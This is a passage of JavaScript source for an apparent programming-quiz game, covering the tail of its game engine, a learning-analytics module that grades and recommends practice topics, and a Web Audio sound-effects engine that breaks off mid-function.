      throw new Error(`[GameEngine.nextQuestion] Cannot advance to next question in state: ${this._state}`);
    }

    const hasNext = this._session.advance();

    if (hasNext) {
      this._transitionTo(ENGINE_STATES.ACTIVE, {
        questionIndex: this._session.currentIndex
      });
      return {
        advanced: true,
        completed: false,
        question: this.getCurrentQuestion()
      };
    } else {
      this._transitionTo(ENGINE_STATES.COMPLETED, {
        summary: this._session.getSummary()
      });
      this._emit('session:completed', this._session.getSummary());
      return {
        advanced: false,
        completed: true,
        question: null
      };
    }
  }

  /**
   * Forfeit or terminate the active session immediately.
   * @returns {object} Final session summary
   */
  forfeitSession() {
    if (this._state === ENGINE_STATES.IDLE || this._state === ENGINE_STATES.COMPLETED) {
      return this._session ? this._session.getSummary() : null;
    }

    this._session.isCompleted = true;
    this._session.endTime = Date.now();
    this._transitionTo(ENGINE_STATES.COMPLETED, { forfeited: true });
    this._emit('session:forfeited', this._session.getSummary());
    return this._session.getSummary();
  }

  /**
   * Retrieve complete performance summary of the session.
   * @returns {object|null}
   */
  getSessionSummary() {
    if (!this._session) return null;
    return this._session.getSummary();
  }

  /**
   * Event subscription helper.
   * @param {string} event
   * @param {Function} callback
   * @returns {Function} Unsubscribe
   */
  on(event, callback) {
    if (!this._listeners.has(event)) {
      this._listeners.set(event, new Set());
    }
    this._listeners.get(event).add(callback);
    return () => this._listeners.get(event).delete(callback);
  }

  _emit(event, data) {
    if (this._listeners.has(event)) {
      this._listeners.get(event).forEach(cb => {
        try { cb(data); } catch (e) { console.error(`[GameEngine event:${event}]`, e); }
      });
    }
  }

  _transitionTo(nextState, context = {}) {
    const prevState = this._state;
    this._state = nextState;
    this._emit('state:change', { prevState, nextState, ...context });
  }
}

/* --- End of js/game-engine.js --- */

/* --- Start of js/analytics.js --- */
/**
 * SyntaxArena Learning Analytics & Performance Engine (Batch 7)
 * Pure, deterministic functions for topic mastery classification, language & difficulty
 * aggregations, historical trend tracking, and evidence-based learning recommendations.
 * Source of truth: docs/MVP_SPEC.md, docs/GAME_RULES.md, docs/ARCHITECTURE.md
 */

// =============================================================================
// 1. CONFIGURATION & CONSTANTS
// =============================================================================

var TOPIC_THRESHOLDS = window.TOPIC_THRESHOLDS = Object.freeze({
  STRONG: 80,          // >= 80% accuracy
  DEVELOPING: 50,      // 50% to 79.9% accuracy
  MIN_SAMPLE_SIZE: 2   // Requires >= 2 attempts to avoid 1/1 = 100% false mastery
});

var GRADE_THRESHOLDS = window.GRADE_THRESHOLDS = Object.freeze({
  S: 95,
  A: 85,
  B: 70,
  C: 50
});

var TOPIC_NAMES = window.TOPIC_NAMES = Object.freeze({
  data_structures: 'Data Structures & Collections',
  data_types: 'Data Types & Immutability',
  pointers: 'Pointer Arithmetic & Memory',
  memory: 'Memory Management & Allocation',
  references: 'Value vs Reference Semantics',
  control_flow: 'Control Flow & Conditionals',
  functions: 'Functions & Scope Binding',
  oop: 'Object-Oriented Programming',
  concurrency: 'Async & Threading',
  type_system: 'Type System & Type Conversions',
  syntax_semantics: 'Syntax & Operator Precedence',
  error_handling: 'Exception & Error Handling'
});

// =============================================================================
// 2. CORE STATISTICAL & AGGREGATION FUNCTIONS
// =============================================================================

var Analytics = window.Analytics = {
  TOPIC_THRESHOLDS,
  GRADE_THRESHOLDS,
  TOPIC_NAMES,

  /**
   * Safe accuracy percentage calculation.
   * Prevents division by zero and invalid inputs.
   *
   * @param {number} correct - Number of correct answers
   * @param {number} attempted - Total questions attempted
   * @returns {number} Integer between 0 and 100
   */
  calculateAccuracy(correct, attempted) {
    const c = Math.max(0, parseInt(correct, 10) || 0);
    const a = Math.max(0, parseInt(attempted, 10) || 0);
    if (a === 0) return 0;
    return Math.min(100, Math.max(0, Math.round((c / a) * 100)));
  },

  /**
   * Formats a technical topic identifier into a human-friendly title.
   * @param {string} topicKey
   * @returns {string}
   */
  formatTopicName(topicKey) {
    if (!topicKey || typeof topicKey !== 'string') return 'Core Programming Concepts';
    const clean = topicKey.trim().toLowerCase();
    if (TOPIC_NAMES[clean]) return TOPIC_NAMES[clean];
    return clean
      .split('_')
      .map(word => word.charAt(0).toUpperCase() + word.slice(1))
      .join(' ');
  },

  /**
   * Classify topic mastery based on accuracy and sample size.
   *
   * @param {number} accuracy - Percentage (0-100)
   * @param {number} attempts - Number of question attempts
   * @returns {'strong'|'developing'|'needs_practice'|'insufficient_data'}
   */
  classifyTopic(accuracy, attempts) {
    const att = Math.max(0, parseInt(attempts, 10) || 0);
    const acc = Math.max(0, Math.min(100, parseInt(accuracy, 10) || 0));

    if (att < TOPIC_THRESHOLDS.MIN_SAMPLE_SIZE) {
      return 'insufficient_data';
    }
    if (acc >= TOPIC_THRESHOLDS.STRONG) {
      return 'strong';
    }
    if (acc >= TOPIC_THRESHOLDS.DEVELOPING) {
      return 'developing';
    }
    return 'needs_practice';
  },

  /**
   * Evaluate stage performance grade and messaging.
   *
   * @param {number} accuracy - Accuracy percentage (0-100)
   * @param {boolean} [isGameOver=false] - True if Hardcore mode 0 hearts
   * @returns {{ grade: string, title: string, subtitle: string, badgeClass: string, colorVar: string }}
   */
  getGradeData(accuracy, isGameOver = false) {
    const acc = Math.max(0, Math.min(100, parseInt(accuracy, 10) || 0));

    if (isGameOver) {
      return {
        grade: 'TERM',
        title: 'Run Terminated',
        subtitle: 'Hearts depleted before stage completion. Score & XP committed.',
        badgeClass: 'badge-coral',
        colorVar: 'var(--color-danger)'
      };
    }

    if (acc >= GRADE_THRESHOLDS.S) {
      return {
        grade: 'S',
        title: 'Flawless Precision',
        subtitle: 'Outstanding code-tracing and syntactic mastery!',
        badgeClass: 'badge-emerald',
        colorVar: 'var(--color-primary)'
      };
    }
    if (acc >= GRADE_THRESHOLDS.A) {
      return {
        grade: 'A',
        title: 'High Dexterity',
        subtitle: 'Strong conceptual comprehension with minimal mistakes.',
        badgeClass: 'badge-emerald',
        colorVar: 'var(--color-primary)'
      };
    }
    if (acc >= GRADE_THRESHOLDS.B) {
      return {
        grade: 'B',
        title: 'Solid Understanding',
        subtitle: 'Good execution insight; review edge cases to reach perfection.',
        badgeClass: 'badge-cyan',
        colorVar: 'var(--color-success)'
      };
    }
    if (acc >= GRADE_THRESHOLDS.C) {
      return {
        grade: 'C',
        title: 'Developing Grasp',
        subtitle: 'Passable execution understanding; review missed questions.',
        badgeClass: 'badge-amber',
        colorVar: 'var(--color-warning)'
      };
    }
    return {
      grade: 'F',
      title: 'Needs Reinforcement',
      subtitle: 'Multiple core misconceptions detected. Recommended: Review explanations.',
      badgeClass: 'badge-coral',
      colorVar: 'var(--color-danger)'
    };
  },

  /**
   * Group question outcome records by topic and calculate per-topic statistics.
   *
   * @param {Array<object>} results - Array of question outcome records
   * @returns {Array<object>} Sorted list of topic performance objects
   */
  groupResultsByTopic(results) {
    if (!Array.isArray(results) || results.length === 0) {
      return [];
    }

    const topicMap = new Map();

    results.forEach((item, index) => {
      if (!item || typeof item !== 'object') return;
      const topicKey = (item.topic || 'general').trim().toLowerCase();
      const isCorrect = Boolean(item.isCorrect || item.correct);

      if (!topicMap.has(topicKey)) {
        topicMap.set(topicKey, {
          topic: topicKey,
          topicName: this.formatTopicName(topicKey),
          attempted: 0,
          correct: 0,
          incorrect: 0,
          subtopics: new Set(),
          questionIds: []
        });
      }

      const entry = topicMap.get(topicKey);
      entry.attempted++;
      if (isCorrect) {
        entry.correct++;
      } else {
        entry.incorrect++;
      }
      if (item.subtopic) {
        entry.subtopics.add(item.subtopic);
      }
      if (item.questionId || item.id) {
        entry.questionIds.push(item.questionId || item.id);
      }
    });

    const output = [];
    topicMap.forEach(data => {
      const accuracy = this.calculateAccuracy(data.correct, data.attempted);
      const classification = this.classifyTopic(accuracy, data.attempted);

      output.push({
        topic: data.topic,
        topicName: data.topicName,
        attempted: data.attempted,
        correct: data.correct,
        incorrect: data.incorrect,
        accuracy,
        classification,
        subtopics: Array.from(data.subtopics),
        questionIds: data.questionIds
      });
    });

    // Sort: lowest accuracy first to highlight weaknesses, then by volume
    return output.sort((a, b) => {
      if (a.accuracy !== b.accuracy) return a.accuracy - b.accuracy;
      return b.attempted - a.attempted;
    });
  },

  /**
   * Aggregate career performance for a specific programming language.
   *
   * @param {Array<object>} sessions - All completed historical session records
   * @param {'python'|'c'|'cpp'|'java'} language - Target language
   * @returns {object} Aggregated language performance summary
   */
  aggregateLanguageStats(sessions, language) {
    const lang = (language || 'python').toLowerCase().trim();
    const safeSessions = Array.isArray(sessions) ? sessions : [];
    const matched = safeSessions.filter(s => s && (s.language || '').toLowerCase().trim() === lang);

    if (matched.length === 0) {
      return {
        language: lang,
        hasData: false,
        totalSessions: 0,
        completedSessions: 0,
        questionsAttempted: 0,
        questionsCorrect: 0,
        questionsIncorrect: 0,
        accuracy: 0,
        bestScore: 0,
        totalScore: 0,
        strongTopics: [],
        weakTopics: []
      };
    }

    let totalSessions = matched.length;
    let completedSessions = 0;
    let questionsAttempted = 0;
    let questionsCorrect = 0;
    let bestScore = 0;
    let totalScore = 0;
    const allResults = [];

    matched.forEach(s => {
      const isRetry = s.mode === 'retry_missed' || Boolean(s.isRetryMissed);
      if (s.isCompleted !== false) completedSessions++;
      const att = parseInt(s.questionsAttempted, 10) || 0;
      const corr = parseInt(s.questionsCorrect, 10) || 0;
      const sc = parseInt(s.totalScore || s.score, 10) || 0;

      if (!isRetry) {
        questionsAttempted += att;
        questionsCorrect += corr;
      }
      totalScore += sc;
      if (sc > bestScore) bestScore = sc;

      if (Array.isArray(s.results)) {
        allResults.push(...s.results);
      }
    });

    const accuracy = this.calculateAccuracy(questionsCorrect, questionsAttempted);
    const topicBreakdown = this.groupResultsByTopic(allResults);

    const strongTopics = topicBreakdown.filter(t => t.classification === 'strong');
    const weakTopics = topicBreakdown.filter(t => t.classification === 'needs_practice');

    return {
      language: lang,
      hasData: true,
      totalSessions,
      completedSessions,
      questionsAttempted,
      questionsCorrect,
      questionsIncorrect: Math.max(0, questionsAttempted - questionsCorrect),
      accuracy,
      bestScore,
      totalScore,
      topicBreakdown,
      strongTopics,
      weakTopics
    };
  },

  /**
   * Aggregate career performance for a specific difficulty tier.
   *
   * @param {Array<object>} sessions - Historical session records
   * @param {'beginner'|'intermediate'|'expert'} difficulty - Target tier
   * @returns {object} Tier metrics summary
   */
  aggregateDifficultyStats(sessions, difficulty) {
    const diff = (difficulty || 'beginner').toLowerCase().trim();
    const safeSessions = Array.isArray(sessions) ? sessions : [];
    const matched = safeSessions.filter(s => s && (s.difficulty || '').toLowerCase().trim() === diff);

    if (matched.length === 0) {
      return {
        difficulty: diff,
        hasData: false,
        totalSessions: 0,
        completedSessions: 0,
        questionsAttempted: 0,
        questionsCorrect: 0,
        accuracy: 0,
        avgScore: 0,
        bestScore: 0
      };
    }

    let totalSessions = matched.length;
    let completedSessions = 0;
    let questionsAttempted = 0;
    let questionsCorrect = 0;
    let bestScore = 0;
    let totalScore = 0;

    matched.forEach(s => {
      const isRetry = s.mode === 'retry_missed' || Boolean(s.isRetryMissed);
      if (s.isCompleted !== false) completedSessions++;
      const att = parseInt(s.questionsAttempted, 10) || 0;
      const corr = parseInt(s.questionsCorrect, 10) || 0;
      const sc = parseInt(s.totalScore || s.score, 10) || 0;

      if (!isRetry) {
        questionsAttempted += att;
        questionsCorrect += corr;
      }
      totalScore += sc;
      if (sc > bestScore) bestScore = sc;
    });

    const accuracy = this.calculateAccuracy(questionsCorrect, questionsAttempted);
    const avgScore = completedSessions > 0 ? Math.round(totalScore / completedSessions) : 0;

    return {
      difficulty: diff,
      hasData: true,
      totalSessions,
      completedSessions,
      questionsAttempted,
      questionsCorrect,
      questionsIncorrect: Math.max(0, questionsAttempted - questionsCorrect),
      accuracy,
      avgScore,
      bestScore
    };
  },

  /**
   * Calculate chronological trend metrics across historical sessions.
   *
   * @param {Array<object>} sessions - Historical session records
   * @param {number} [maxEntries=10] - Number of recent records to analyze
   * @returns {{ points: Array<object>, trend: 'improving'|'declining'|'steady'|'neutral', avgAccuracy: number }}
   */
  calculateHistoricalTrend(sessions, maxEntries = 10) {
    if (!Array.isArray(sessions) || sessions.length === 0) {
      return {
        points: [],
        trend: 'neutral',
        avgAccuracy: 0
      };
    }

    // Filter valid completed or attempted sessions and sort chronologically (oldest to newest)
    const valid = sessions
      .filter(s => s && typeof s === 'object' && (s.questionsAttempted > 0 || s.totalQuestions > 0))
      .sort((a, b) => (a.timestamp || a.startTime || 0) - (b.timestamp || b.startTime || 0));

    const slice = valid.slice(-maxEntries);
    if (slice.length === 0) {
      return { points: [], trend: 'neutral', avgAccuracy: 0 };
    }

    let sumAcc = 0;
    const points = slice.map((s, idx) => {
      const att = s.questionsAttempted || s.totalQuestions || 0;
      const corr = s.questionsCorrect !== undefined ? s.questionsCorrect : (s.correctCount || 0);
      const acc = s.accuracy !== undefined ? s.accuracy : this.calculateAccuracy(corr, att);
      sumAcc += acc;

      return {
        index: idx + 1,
        sessionId: s.sessionId || s.id || `sess_${idx}`,
        date: s.timestamp ? new Date(s.timestamp).toLocaleDateString() : 'Recent',
        language: s.language || 'python',
        difficulty: s.difficulty || 'beginner',
        score: s.totalScore || s.score || 0,
        accuracy: acc,
        isCompleted: s.isCompleted !== false
      };
    });

    const avgAccuracy = Math.round(sumAcc / points.length);

    // Determine slope / trend
    let trend = 'steady';
    if (points.length >= 3) {
      const firstHalf = points.slice(0, Math.floor(points.length / 2));
      const secondHalf = points.slice(Math.floor(points.length / 2));

      const avg1 = firstHalf.reduce((sum, p) => sum + p.accuracy, 0) / firstHalf.length;
      const avg2 = secondHalf.reduce((sum, p) => sum + p.accuracy, 0) / secondHalf.length;

      const diff = avg2 - avg1;
      if (diff >= 5) trend = 'improving';
      else if (diff <= -5) trend = 'declining';
      else trend = 'steady';
    }

    return {
      points,
      trend,
      avgAccuracy
    };
  },

  /**
   * Deterministic learning recommendations generator.
   * Traceable, evidence-backed next steps without external APIs or fabricated AI.
   *
   * @param {object} sessionSummary - The completed or inspected session summary
   * @param {object} profile - Active player profile
   * @returns {Array<object>} Prioritized list of actionable recommendations
   */
  generateRecommendations(sessionSummary, profile = {}) {
    const recs = [];
    if (!sessionSummary || typeof sessionSummary !== 'object') {
      return [
        {
          id: 'rec_get_started',
          type: 'general',
          title: 'Enter the Challenge Arena',
          reason: 'Complete your first programming challenge session to unlock personalized analytics.',
          actionLabel: 'Launch Beginner Arena',
          actionUrl: 'game.html?lang=python&diff=beginner&mode=campaign'
        }
      ];
    }

    const lang = (sessionSummary.language || 'python').toLowerCase();
    const diff = (sessionSummary.difficulty || 'beginner').toLowerCase();
    const accuracy = sessionSummary.accuracy !== undefined
      ? sessionSummary.accuracy
      : this.calculateAccuracy(sessionSummary.questionsCorrect, sessionSummary.questionsAttempted);

    const results = Array.isArray(sessionSummary.results) ? sessionSummary.results : [];
    const topicBreakdown = this.groupResultsByTopic(results);
    const playerLevel = (profile && profile.level) || 1;

    // 1. Weak Topic Recommendation (Immediate pedagogical focus)
    const weakTopic = topicBreakdown.find(t => t.classification === 'needs_practice');
    if (weakTopic) {
      recs.push({
        id: `rec_topic_${weakTopic.topic}`,
        type: 'weak_topic',
        priority: 1,
        title: `Reinforce: ${weakTopic.topicName}`,
        reason: `Accuracy was ${weakTopic.accuracy}% (${weakTopic.correct}/${weakTopic.attempted} correct) on this topic during your run.`,
        actionLabel: `Practice ${weakTopic.topicName}`,
        actionUrl: `game.html?lang=${lang}&diff=${diff}&topic=${encodeURIComponent(weakTopic.topic)}&mode=practice`
      });
    }

    // 2. Retry Missed Questions Recommendation
    const missedCount = sessionSummary.incorrectCount !== undefined
      ? sessionSummary.incorrectCount
      : (sessionSummary.questionsAttempted - sessionSummary.questionsCorrect);

    if (missedCount > 0) {
      recs.push({
        id: 'rec_retry_missed',
        type: 'retry_missed',
        priority: 2,
        title: `Retry ${missedCount} Missed Question${missedCount > 1 ? 's' : ''}`,
        reason: 'Consolidate understanding by re-attempting concepts you missed with step-by-step explanations.',
        actionLabel: 'Launch Retry Session',
        actionUrl: `game.html?lang=${lang}&diff=${diff}&mode=retry_missed`
      });
    }

    // 3. Tier Advancement Recommendation
    if (accuracy >= 85 && (sessionSummary.questionsAttempted || 0) >= 4) {
      if (diff === 'beginner') {
        recs.push({
          id: 'rec_advance_intermediate',
          type: 'tier_advance',
          priority: 3,
          title: `Advance to Intermediate ${this.formatTopicName(lang)}`,
          reason: `High precision (${accuracy}%) on Beginner! You are ready for pointer aliasing, closures, and object lifetimes.`,
          actionLabel: 'Launch Intermediate Track',
          actionUrl: `game.html?lang=${lang}&diff=intermediate&mode=campaign`
        });
      } else if (diff === 'intermediate') {
        recs.push({
          id: 'rec_advance_expert',
          type: 'tier_advance',
          priority: 3,
          title: `Challenge the Expert ${this.formatTopicName(lang)} Tier`,
          reason: `Formidable mastery (${accuracy}%) on Intermediate. Tackle edge-case semantics and compiler internals.`,
          actionLabel: 'Launch Expert Track',
          actionUrl: `game.html?lang=${lang}&diff=expert&mode=campaign`
        });
      }
    }

    // 4. Hardcore Mode Recommendation (Level 5+ unlocked)
    if (accuracy >= 90 && playerLevel >= 5 && sessionSummary.mode !== 'hardcore') {
      recs.push({
        id: 'rec_try_hardcore',
        type: 'challenge_mode',
        priority: 4,
        title: 'Test Your Mastery in Hardcore Mode',
        reason: 'You have proven high accuracy and reached Level 5+. Test your nerves with 3 hearts and no hints!',
        actionLabel: 'Enter Hardcore Arena',
        actionUrl: `game.html?lang=${lang}&diff=${diff}&mode=hardcore`
      });
    }

    // 5. Polyglot Track Exploration
    const campaign = (profile && profile.campaign) || {};
    const unplayedLangs = ['python', 'c', 'cpp', 'java', 'cyber', 'javascript', 'rust', 'sql'].filter(l => {
      const camp = campaign[l];
      return !camp || (camp.beginnerStars === 0 && camp.unlockedTier === 'beginner');
    });

    if (unplayedLangs.length > 0 && recs.length < 3) {
      const nextLang = unplayedLangs[0];
      const titles = {
        python: 'Python 3',
        c: 'C (C99)',
        cpp: 'C++',
        java: 'Java',
        cyber: 'Cyber & Linux',
        javascript: 'JavaScript',
        rust: 'Rust',
        sql: 'SQL'
      };
      const langTitle = titles[nextLang] || nextLang.toUpperCase();
      recs.push({
        id: `rec_explore_${nextLang}`,
        type: 'polyglot',
        priority: 5,
        title: `Explore the ${langTitle} Arena Track`,
        reason: `Broaden your systems insight by tackling language-specific execution mechanics in ${langTitle}.`,
        actionLabel: `Begin ${langTitle} Track`,
        actionUrl: `game.html?lang=${nextLang}&diff=beginner&mode=campaign`
      });
    }

    // Ensure at least 1 helpful recommendation
    if (recs.length === 0) {
      recs.push({
        id: 'rec_general_play',
        type: 'general',
        priority: 6,
        title: 'Run Stage Again',
        reason: 'Solid session performance! Play again to improve your score and speed multipliers.',
        actionLabel: 'Replay Challenge Track',
        actionUrl: `game.html?lang=${lang}&diff=${diff}&mode=campaign`
      });
    }

    // Sort by priority and cap at 3 recommendations
    return recs.sort((a, b) => a.priority - b.priority).slice(0, 3);
  }
};

/* --- End of js/analytics.js --- */

/* --- Start of js/audio.js --- */
/**
 * SyntaxArena Procedural Audio & Music Engine
 * Real-time sound effects and procedural ambient background music via native Web Audio API.
 * Zero external libraries or runtime downloads.
 * Source of truth: docs/ARCHITECTURE.md & docs/DESIGN_SYSTEM.md & docs/BATCH_8_PLAN.md
 */


class ProceduralAudioEngine {
  constructor() {
    this._ctx = null;
    this._isUnlocked = false;
    this._musicPlaying = false;
    this._musicGain = null;
    this._activeMusicNodes = [];
    this._musicInterval = null;
    this._musicChordIndex = 0;
  }

  /**
   * Lazily obtain or initialize the AudioContext upon user gesture.
   */
  _getContext() {
    if (typeof window === 'undefined') return null;
    if (!this._ctx) {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) {
        try {
          this._ctx = new AudioCtx();
        } catch (_) {
          this._ctx = null;
        }
      }
    }
    if (this._ctx && this._ctx.state === 'suspended') {
      this._ctx.resume().catch(() => {});
    }
    return this._ctx;
  }

  /**
   * Get current SFX volume scaling factor from settings.
   * Returns 0 if sound is explicitly disabled or volume is 0.
   */
  _getVolume() {
    try {
      const settings = State.get('settings') || {};
      if (settings.soundEnabled === false) return 0;
      return typeof settings.sfxVolume === 'number' ? Math.max(0, Math.min(1, settings.sfxVolume)) : 0.8;
    } catch (_) {
      return 0.8;
    }
  }

  /**
   * Get current background music volume from settings.
   * Returns 0 if music is disabled or volume is 0.
   */
  _getMusicVolume() {
    try {
      const settings = State.get('settings') || {};
      if (!settings.musicEnabled) return 0;
      return typeof settings.musicVolume === 'number' ? Math.max(0, Math.min(1, settings.musicVolume)) : 0.5;
    } catch (_) {
      return 0;
    }
  }

  /**
   * Unlock AudioContext on first user interaction.
   */
  unlock() {
    if (this._isUnlocked) return;
    const ctx = this._getContext();
    if (ctx) {
      this._isUnlocked = true;
      if (ctx.state === 'suspended') {
        ctx.resume().catch(() => {});
      }
    }
  }

  /**
   * Fallback audio file player using HTML5 Audio element.
   * @param {string} filename
   */
  _playWav(filename) {
    if (typeof Audio === 'undefined') return;
    try {
      const vol = this._getVolume();
      if (vol <= 0) return;
      const audio = new Audio(`assets/audio/${filename}`);
      audio.volume = vol;
      audio.play().catch(() => {});
    } catch (_) {}
  }

  /* ==========================================================================
     SOUND EFFECTS (SFX)
     ========================================================================== */

  /**
   * Tactile button press click (15ms sine decay).
   */
  playClick() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      const now = ctx.currentTime;

      osc.type = 'sine';
      osc.frequency.setValueAtTime(600, now);
      osc.frequency.exponentialRampToValueAtTime(150, now + 0.03);

      gain.gain.setValueAtTime(vol * 0.25, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.03);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.035);
    } catch (_) {}
  }

  /**
   * Correct Answer Chime (Ascending two-tone bell chord).
   */
  playSuccess() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      const now = ctx.currentTime;

      // Note 1: C6 (1046.5 Hz)
      const osc1 = ctx.createOscillator();
      const gain1 = ctx.createGain();
      osc1.type = 'sine';
      osc1.frequency.setValueAtTime(1046.5, now);
      gain1.gain.setValueAtTime(vol * 0.3, now);
      gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.18);
      osc1.connect(gain1);
      gain1.connect(ctx.destination);
      osc1.start(now);
      osc1.stop(now + 0.2);

      // Note 2: G6 (1567.98 Hz) delayed by 60ms
      const osc2 = ctx.createOscillator();
      const gain2 = ctx.createGain();
      osc2.type = 'sine';
      osc2.frequency.setValueAtTime(1567.98, now + 0.06);
      gain2.gain.setValueAtTime(vol * 0.35, now + 0.06);
      gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.32);
      osc2.connect(gain2);
      gain2.connect(ctx.destination);
      osc2.start(now + 0.06);
      osc2.stop(now + 0.35);
    } catch (_) {}
  }

  /**
   * Incorrect Answer Buzz (Low discordant sawtooth with filter).
   */
  playError() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      const now = ctx.currentTime;
      const osc = ctx.createOscillator();
      const filter = ctx.createBiquadFilter();
      const gain = ctx.createGain();

      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(140, now);
      osc.frequency.linearRampToValueAtTime(95, now + 0.22);

      filter.type = 'lowpass';
      filter.frequency.setValueAtTime(450, now);

      gain.gain.setValueAtTime(vol * 0.35, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.25);

      osc.connect(filter);
      filter.connect(gain);
      gain.connect(ctx.destination);

      osc.start(now);
      osc.stop(now + 0.26);
    } catch (_) {}
  }

  /**
   * Streak Multiplier Increase (Rising whoosh with resonance).
   */
  playStreak() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      const now = ctx.currentTime;
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();

      osc.type = 'triangle';
      osc.frequency.setValueAtTime(320, now);
      osc.frequency.exponentialRampToValueAtTime(980, now + 0.2);

      gain.gain.setValueAtTime(vol * 0.28, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.22);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.23);
    } catch (_) {}
  }

  /**
   * Hint Activated Ping (Subtle soft tone).
   */
  playHint() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      const now = ctx.currentTime;
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();

      osc.type = 'sine';
      osc.frequency.setValueAtTime(800, now);
      osc.frequency.exponentialRampToValueAtTime(1200, now + 0.12);

      gain.gain.setValueAtTime(vol * 0.2, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.15);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.16);
    } catch (_) {}
  }

  /**
   * Victory Fanfare (Ascending major 4-note victory flourish).
   */
  playFanfare() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      const notes = [523.25, 659.25, 783.99, 1046.5]; // C5, E5, G5, C6
      const now = ctx.currentTime;

      notes.forEach((freq, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        const start = now + (idx * 0.09);
        const dur = idx === 3 ? 0.45 : 0.12;

        osc.type = 'triangle';
        osc.frequency.setValueAtTime(freq, start);

        gain.gain.setValueAtTime(vol * 0.35, start);
        gain.gain.exponentialRampToValueAtTime(0.001, start + dur);

        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(start);
        osc.stop(start + dur + 0.05);
      });
    } catch (_) {}
  }

  /**
   * Level Up / Rank Progression Fanfare (Triumphant brass-like 5-note ceremonial chord).
   */
  playLevelUp() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      // C4 (261.63), G4 (392.00), C5 (523.25), E5 (659.25), G5 (783.99)
      const notes = [261.63, 392.00, 523.25, 659.25, 783.99];
      const now = ctx.currentTime;

      notes.forEach((freq, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        const start = now + (idx * 0.08);
        const dur = idx === 4 ? 0.6 : 0.16;

        osc.type = 'triangle';
        osc.frequency.setValueAtTime(freq, start);

        gain.gain.setValueAtTime(vol * 0.3, start);
        gain.gain.exponentialRampToValueAtTime(0.001, start + dur);

        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(start);
        osc.stop(start + dur + 0.05);
      });
    } catch (_) {}
  }

  /**
   * Achievement Badge Unlock Chime (Sparkling 4-note ascending chime).
   */
  playBadge() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      // E6 (1318.5), G#6 (1661.2), B6 (1975.5), E7 (2637.0)
      const notes = [1318.5, 1661.2, 1975.5, 2637.0];
      const now = ctx.currentTime;

      notes.forEach((freq, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        const start = now + (idx * 0.07);
        const dur = idx === 3 ? 0.35 : 0.14;

        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq, start);

        gain.gain.setValueAtTime(vol * 0.28, start);
        gain.gain.exponentialRampToValueAtTime(0.001, start + dur);

        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(start);
        osc.stop(start + dur + 0.05);
      });
    } catch (_) {}
  }

  /**
   * XP Reward Ticker Sound (Ascending micro-tone progression).
   */
  playXP() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      const frequencies = [600, 750, 900, 1050];
      const now = ctx.currentTime;

      frequencies.forEach((freq, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        const start = now + (idx * 0.04);

        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq, start);

        gain.gain.setValueAtTime(vol * 0.2, start);
        gain.gain.exponentialRampToValueAtTime(0.001, start + 0.08);

        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(start);
        osc.stop(start + 0.09);
      });
    } catch (_) {}
  }

  /**
   * Micro-tick for numeric counters rolling up.
   */
  playCount() {
    const vol = this._getVolume();
    if (vol <= 0) return;
    const ctx = this._getContext();
    if (!ctx) return;

    try {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      const now = ctx.currentTime;

      osc.type = 'sine';
      osc.frequency.setValueAtTime(1200, now);

      gain.gain.setValueAtTime(vol * 0.08, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.015);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.02);
    } catch (_) {}
  }

  /* ==========================================================================
     PROCEDURAL AMBIENT BACKGROUND MUSIC
     Calming, lo-fi cyber chord ambient synthesizer with zero external assets.
     ========================================================================== */

  /**
   * Check whether background music is actively playing.
   * @returns {boolean}
   */
  isMusicPlaying() {
    return this._musicPlaying;
  }

  /**
   * Start procedural ambient background music.
   * Respects user settings and browser audio state.
   */
  startMusic() {
    const vol = this._getMusicVolume();
    if (vol <= 0) {
      this.stopMusic();
      return;
    }

    if (this._musicPlaying) {
      this.setMusicVolume(vol);
      return;
    }

    const ctx = this._getContext();
    if (!ctx) return;

    try {
      this._musicPlaying = true;

      // Master music gain node
      this._musicGain = ctx.createGain();
      this._musicGain.gain.setValueAtTime(vol * 0.12, ctx.currentTime);
      this._musicGain.connect(ctx.destination);

      // Ambient Cyber Chord Progression:
